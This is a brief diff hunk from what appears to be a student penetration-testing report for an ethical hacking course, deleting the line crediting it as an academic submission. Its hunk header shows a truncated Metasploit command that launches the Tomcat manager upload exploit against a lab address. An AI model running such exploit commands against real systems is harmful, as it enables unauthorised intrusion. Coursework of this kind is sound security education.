@@ -93,5 +93,3 @@ msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS 192.168.5
 * Review Nessus/Nmap output files manually for detailed CVE correlation.
 
 ---
-
-**Prepared for Academic Submission – ICT387 Ethical Hacking and Software Security Project**
